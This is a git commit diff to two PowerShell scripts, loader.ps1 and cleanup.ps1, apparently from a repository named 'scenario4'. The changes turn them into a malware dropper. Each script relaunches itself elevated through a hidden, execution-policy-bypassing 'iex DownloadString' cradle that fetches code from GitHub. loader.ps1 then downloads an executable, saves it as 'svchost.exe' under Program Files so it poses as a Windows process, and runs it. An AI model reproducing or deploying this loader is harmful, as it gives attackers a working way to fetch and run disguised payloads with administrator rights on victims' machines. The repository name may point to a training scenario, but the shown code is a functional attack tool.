30d4ca566227fd8de7380040b17f76736c21f4b9
Justanother-engineer <charanmk99@gmail.com>
2026-07-16 02:52:08 +0530

    update

--- cleanup.ps1
+++ cleanup.ps1
@@ -1,7 +1,8 @@
+$scriptUrl = "https://raw.githubusercontent.com/Justanother-engineer/scenario4/main/cleanup.ps1"
 $dst = "C:\Program Files\Microsoft\svchost.exe"
 
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs
+    Start-Process powershell.exe "-NoP -NonI -Exec Bypass -Command `"iex ((New-Object Net.WebClient).DownloadString('$scriptUrl'))`"" -Verb RunAs
     exit
 }
 
--- loader.ps1
+++ loader.ps1
@@ -1,11 +1,12 @@
-$url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/elevcheck.exe"
+$scriptUrl = "https://raw.githubusercontent.com/Justanother-engineer/scenario4/main/loader.ps1"
+$exeUrl = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/elevcheck.exe"
 $dst = "C:\Program Files\Microsoft\svchost.exe"
 
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs
+    Start-Process powershell.exe "-NoP -NonI -Exec Bypass -Command `"iex ((New-Object Net.WebClient).DownloadString('$scriptUrl'))`"" -Verb RunAs
     exit
 }
 
 New-Item -Path "C:\Program Files\Microsoft" -ItemType Directory -Force | Out-Null
-Invoke-WebRequest -Uri $url -OutFile $dst
+Invoke-WebRequest -Uri $exeUrl -OutFile $dst
 Start-Process -FilePath $dst
